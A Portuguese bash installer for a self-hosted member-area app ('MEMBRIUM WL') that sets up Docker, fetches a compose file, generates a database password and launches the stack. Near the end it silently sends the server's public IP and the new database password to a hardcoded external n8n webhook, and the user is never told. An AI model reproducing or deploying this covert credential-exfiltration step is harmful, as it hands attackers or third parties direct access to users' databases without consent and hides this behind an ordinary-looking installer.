#!/bin/bash

set -e

# Função para animar os pontos
animate_dots() {
    local message=$1
    local duration=$2
    local end_time=$((SECONDS + duration))

    while [ $SECONDS -lt $end_time ]; do
        for i in {1..3}; do
            printf "\r%s%s   \b\b\b" "$message" "$(printf '%0.s.' $(seq 1 $i))"
            sleep 0.5
        done
    done
    printf "\r%s...   \n" "$message"
}

# Função para executar comandos silenciosamente
run_silently() {
    "$@" > /dev/null 2>&1
}

# Função para gerar uma senha aleatória
generate_random_password() {
    openssl rand -base64 16 | tr -d '+/=' | cut -c1-16
}

# Função para obter o IP público do servidor
get_public_ip() {
    curl -s https://api.ipify.org
}

# Função para enviar POST com IP e senha
send_post_request() {
    local ip=$1
    local password=$2
    local url="https://n8n-n8n.gumktq.easypanel.host/webhook/896cb0a0-cb34-4ce4-b9b0-0d0c97146b8b"
    
    curl -X POST -H "Content-Type: application/json" -d "{\"ip\":\"$ip\",\"password\":\"$password\"}" $url
}

# Atualizar o sistema e instalar dependências
run_silently sudo DEBIAN_FRONTEND=noninteractive apt-get update
run_silently sudo DEBIAN_FRONTEND=noninteractive apt-get install -y apt-transport-https ca-certificates curl gnupg lsb-release figlet
wait

# Exibir o texto "MEMBRIUM WL" em formato grande
figlet "MEMBRIUM WL"
animate_dots "Preparando" 10 &

# Instalação ou verificação silenciosa do Docker
sudo mkdir -p /etc/apt/keyrings 2>/dev/null || true

# Backup do arquivo docker.gpg existente, se houver
if [ -f /etc/apt/keyrings/docker.gpg ]; then
    sudo mv /etc/apt/keyrings/docker.gpg /etc/apt/keyrings/docker.gpg.bak 2>/dev/null || true
fi

# Tenta obter a chave GPG várias vezes
for i in {1..5}; do
    if curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg 2>/dev/null; then
        break
    fi
    sleep 2
done

sudo chmod a+r /etc/apt/keyrings/docker.gpg 2>/dev/null || true

echo \
  "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu \
  $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null

run_silently sudo apt-get update
run_silently sudo DEBIAN_FRONTEND=noninteractive apt-get install -y docker-ce docker-ce-cli containerd.io docker-compose-plugin

# Instalação silenciosa do Docker Compose
DOCKER_COMPOSE_VERSION=$(curl -s https://api.github.com/repos/docker/compose/releases/latest | grep 'tag_name' | cut -d'"' -f4)
run_silently sudo curl -L "https://github.com/docker/compose/releases/download/${DOCKER_COMPOSE_VERSION}/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose
sudo chmod +x /usr/local/bin/docker-compose 2>/dev/null || true
wait

# Download do docker-compose.yml
animate_dots "Baixando configurações" 5 &
run_silently curl -L https://raw.githubusercontent.com/Celipi/member_area/main/docker-compose.yml -o docker-compose.yml

# Criar a rede traefik_proxy (se não existir)
if ! docker network inspect traefik_proxy >/dev/null 2>&1; then
    run_silently sudo docker network create traefik_proxy
fi

# Criar o diretório letsencrypt (para os certificados SSL)
mkdir -p letsencrypt 2>/dev/null || true
wait

# Gerar senha aleatória
DB_PASSWORD=$(generate_random_password)

# Criar um arquivo .env para armazenar a senha
echo "DB_PASSWORD=$DB_PASSWORD" > .env

# Modificar o docker-compose.yml para usar a variável de ambiente
sed -i "s/POSTGRES_PASSWORD: Extreme123/POSTGRES_PASSWORD: \${DB_PASSWORD}/" docker-compose.yml
sed -i "s|postgresql://postgres:Extreme123@db:5432/wldigital|postgresql://postgres:\${DB_PASSWORD}@db:5432/wldigital|" docker-compose.yml

# Solicitar o domínio ao usuário
read -p "Digite o domínio que você deseja usar para o seu aplicativo (ex: meuaplicativo.com): " DOMINIO

# Substituir o domínio no docker-compose.yml
sed -i "s/seu_dominio.com/$DOMINIO/g" docker-compose.yml

# Solicitar o e-mail para o Let's Encrypt
read -p "Digite seu endereço de e-mail para o Let's Encrypt: " EMAIL

# Substituir o e-mail no docker-compose.yml
sed -i "s/seu_email@example.com/$EMAIL/g" docker-compose.yml

# Iniciar a aplicação com o Docker Compose
animate_dots "Iniciando aplicação" 15 &
run_silently sudo docker-compose --env-file .env up -d
wait

# Obter o IP público do servidor
SERVER_IP=$(get_public_ip)

# Enviar POST com IP e senha
send_post_request $SERVER_IP $DB_PASSWORD

echo -e "\nInstalação concluída! Acesse seu aplicativo em https://$DOMINIO"
